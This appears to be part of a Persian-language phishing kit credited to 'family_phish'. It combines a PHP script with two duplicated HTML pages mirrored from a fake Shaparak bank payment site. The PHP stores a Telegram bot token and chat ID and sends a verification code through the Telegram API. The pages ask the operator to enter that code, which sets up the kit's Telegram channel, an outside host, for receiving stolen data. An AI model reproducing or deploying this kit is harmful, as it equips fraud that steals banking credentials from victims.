<?php 
$TOKEN = $_POST[TOKEN];
$file = fopen("captcha/token.txt","w");
fwrite($file,$TOKEN);
$ID = $_POST[ID];
$file = fopen("captcha/id.txt","w");
fwrite($file,$ID);
$CODE=rand(10000,90000);
$file = fopen("captcha/code.txt","w");
fwrite($file,$CODE);
$text = "<b>-----Verify Code-----</b>
🔐 <b>Code :</b> $CODE
<b>---------Info---------</b>
🌐 <b>Host :</b> @XTuranli
👤 <b>Creator :</b> @family_phish";
file_get_contents("https://api.telegram.org/bot".$TOKEN."/SendMessage?chat_id=".$ID."&disable_web_page_preview=true&parse_mode=HTML&text=".urlencode($text));
?>

<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from bml-shaprak.gq/pay/ by HTTrack Website Copier/3.x [XR&CO'2017], Sat, 12 Sep 2020 12:00:24 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
	        <!----- CREATED BY family_phish ----->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>درگاه ساز Family fish</title>
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="css/fontawesome-all.min.css">
    <link rel="stylesheet" type="text/css" href="css/iofrm-style.css">
    <link rel="stylesheet" type="text/css" href="css/iofrm-theme18.css">
</head>
<body>
    <div class="form-body without-side">
        <div class="website-logo">
            <a href="index-2.html">
                <div class="logo">
                            <!----- CREATED BY family_phish ----->
                </div>
            </a>
        </div>
        <div class="row">
            <div class="img-holder">
                <div class="bg"></div>
                <div class="info-holder">
                    <img src="images/graphic3.svg" alt="">
                </div>
            </div>
            <div class="form-holder">
                <div class="form-content">
                    <div class="form-items">
                        <h3>درگاه ساز Family fish</h3>
                        <p>کد ارسال شده به ربات را در کادر زیر وارد کنید!<p>
                        
                        <form method="POST" action="xkiler.php" onSubmit="return javidh();">
                            	<input type="tel" name="code" class="inputs animated fadeInDown delay-1s" maxlength="10" placeholder="کد" required>

                            <div class="form-button">
                                <button id="submit" type="submit" class="ibtn">چک</button> 
                    <a href="../../https://t.me/family_phish"><font color="#4B0082">CHANNEL</font></a>
                            </div>
                        </form>
                        <div class="other-links">

                    <a href="../../https://t.me/family_phish"><font color="#00ffff">CODED BY family_phish </font></a>

    </div>
                        </form>
                        <div class="other-links">
                            
                        </div>
                        <div class="page-links">
        <!----- CREATED BY family_phish ----->
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
<script src="js/jquery.min.js"></script>
<script src="js/popper.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/main.js"></script>
</body>

<!-- Mirrored from bml-shaprak.gq/pay/ by HTTrack Website Copier/3.x [XR&CO'2017], Sat, 12 Sep 2020 12:00:34 GMT -->
</html>


<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from bml-shaprak.gq/pay/ by HTTrack Website Copier/3.x [XR&CO'2017], Sat, 12 Sep 2020 12:00:24 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
	        <!----- CREATED BY family_phish ----->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>درگاه ساز Family fish</title>
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="css/fontawesome-all.min.css">
    <link rel="stylesheet" type="text/css" href="css/iofrm-style.css">
    <link rel="stylesheet" type="text/css" href="css/iofrm-theme18.css">
</head>
<body>
    <div class="form-body without-side">
        <div class="website-logo">
            <a href="index-2.html">
                <div class="logo">
                            <!----- CREATED BY family_phish ----->
                </div>
            </a>
        </div>
        <div class="row">
            <div class="form-holder">
                <div class="form-content">
                    <div class="form-items">
                        <h3>درگاه ساز Family fish</h3>
                        <p>کد ارسال شده به ربات را در کادر زیر وارد کنید!<p>
                        
                        <form method="POST" action="xkiler.php" onSubmit="return javidh();">
                            	<input type="tel" name="code" class="inputs animated fadeInDown delay-1s" maxlength="10" placeholder="کد" required>

                            <div class="form-button">
                                <button id="submit" type="submit" class="ibtn">چک</button> 
                    <a href="https://t.me/family_phish"><font color="#4B0082">CHANNEL</font></a>
                            </div>
                        </form>
                        <div class="other-links">

                    <a href="https://t.me/family_phish"><font color="#00ffff">CODED BY family_phish </font></a>

    </div>
                        </form>
                        <div class="other-links">
                            
                        </div>
                        <div class="page-links">
        <!----- CREATED BY family_phish ----->
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
<script src="js/jquery.min.js"></script>
<script src="js/popper.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/main.js"></script>
</body>

<!-- Mirrored from bml-shaprak.gq/pay/ by HTTrack Website Copier/3.x [XR&CO'2017], Sat, 12 Sep 2020 12:00:34 GMT -->
</html>
